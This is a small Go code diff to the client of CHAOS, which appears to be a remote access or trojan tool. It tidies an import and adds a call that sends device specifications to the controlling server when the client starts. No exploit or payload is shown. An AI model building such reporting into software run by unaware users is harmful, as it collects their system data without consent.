@@ -2,6 +2,8 @@ package app
 
 import (
 	"context"
+	"log"
+
 	"github.com/tiagorlampert/CHAOS/client/app/environment"
 	"github.com/tiagorlampert/CHAOS/client/app/gateways/client"
 	"github.com/tiagorlampert/CHAOS/client/app/handler"
@@ -17,7 +19,6 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/services/url"
 	"github.com/tiagorlampert/CHAOS/client/app/utils/network"
 	"golang.org/x/sync/errgroup"
-	"log"
 )
 
 type App struct {
@@ -54,6 +55,10 @@ func New(configuration *environment.Configuration) *App {
 
 func (a *App) Run() {
 	g, _ := errgroup.WithContext(context.Background())
+
+	if err := a.Handler.SendDeviceSpecs(); err != nil {
+		log.Fatal("error running client: ", err)
+	}
 
 	g.Go(func() error {
 		a.Handler.KeepConnection()
